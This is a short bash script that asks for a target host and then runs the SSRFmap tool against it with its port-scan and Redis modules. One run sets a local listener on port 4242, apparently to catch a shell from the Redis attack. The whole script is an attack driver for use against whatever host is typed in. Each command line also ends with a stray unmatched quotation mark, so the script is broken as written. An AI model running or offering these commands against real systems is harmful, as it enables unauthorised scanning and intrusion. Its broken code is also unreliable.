#!/bin/bash
echo -e "[+] Entar Target: "
echo -e "[+] Testing all payloads"
read target
python3 ssrfmap.py -r data/request2.txt -p https://$target -m portscan"
python3 ssrfmap.py -r data/request.txt -p https://$target -m redis"
python3 ssrfmap.py -r data/request.txt -p https://$target -m portscan --ssl --uagent 'SSRFmapAgent'"
python3 ssrfmap.py -r data/request.txt -p https://$target -m redis --lhost=127.0.0.1 --lport=4242 -l 4242"
